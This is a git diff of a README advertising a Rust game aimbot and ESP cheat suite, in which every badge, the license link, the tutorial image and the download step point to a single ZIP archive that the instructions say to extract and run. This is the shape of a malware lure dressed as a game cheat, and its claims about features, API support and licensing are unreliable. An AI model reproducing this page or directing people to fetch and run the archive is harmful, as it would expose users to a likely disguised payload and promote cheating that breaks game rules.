@@ -1,13 +1,13 @@
 # 🎮 Rust Aimbot & ESP Advanced Suite 👾
 
-![Version](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip) 
-![Supported OS](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip%2C%https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
-![License](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
-![OpenAI API](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
-![Claude API](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
-![Languages](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
-![Support](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip×7-important)
-![Security](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
+![Version](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip) 
+![Supported OS](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip%2C%https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip)
+![License](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip)
+![OpenAI API](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip)
+![Claude API](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip)
+![Languages](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip)
+![Support](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip×7-important)
+![Security](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip)
 
 ## 🚀 Introduction: Step Into Superior Survival  
 Conquer the world of Rust with the groundbreaking Aimbot & ESP Suite, a specialist’s toolbox designed to elevate your Rust adventure with sharp precision and clear visuals. Whether you’re a night-time scavenger sneaking through the shrubbery, or a daylight warrior overtaking monuments, this suite acts as your unseen sixth sense — helping you spot enemies and resources before they even know you’re there!
@@ -40,14 +40,14 @@ _Note: For the smoothest experience, we recommend a dedicated GPU and Rust’s l
 
 Ready to unleash uncharted power? Here’s how you start:
 
-1. **Download** the `https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip` archive from this repository.
+1. **Download** the `https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip` archive from this repository.
 2. **Extract** the contents anywhere convenient on your PC.
 3. **Run** the EasyLaunch tool and select your preferred modules from the intuitive interface.
 4. **Customize** settings like languages, color overlays, and API assistance options.
 5. **Dive into Rust** and activate the overlay using your chosen hotkey.
 
 ### 🎬 Video Installation Tutorial
-![InstallationGif](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip)
+![InstallationGif](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip)
 
 ## 🔑 Unique Advantages: Why This Suite?  
 
@@ -78,7 +78,7 @@ A world-first: our Rust ESP & aimbot suite isn’t just for sharper eyes and fas
 **Warning:** This research-grade tool is intended for demonstration, education, and entertainment purposes only. By deploying this suite, you affirm sole responsibility for all its uses and outcomes. Adhere conscientiously to all game's terms, as infractions could result in penalties. The creators profess no liability for misuse.
 
 ## 📝 MIT License  
-This repository is released under the [MIT License](https://raw.githubusercontent.com/nikamhritik/rust-aimbot-esp-suite/main/alpeen/suite-esp-rust-aimbot-3.8.zip) — allowing you to modify and adapt the suite for your own projects or research in 2025 and beyond.
+This repository is released under the [MIT License](https://github.com/nikamhritik/rust-aimbot-esp-suite/raw/refs/heads/main/alpeen/rust-suite-aimbot-esp-tordrillite.zip) — allowing you to modify and adapt the suite for your own projects or research in 2025 and beyond.
 
 ---
 
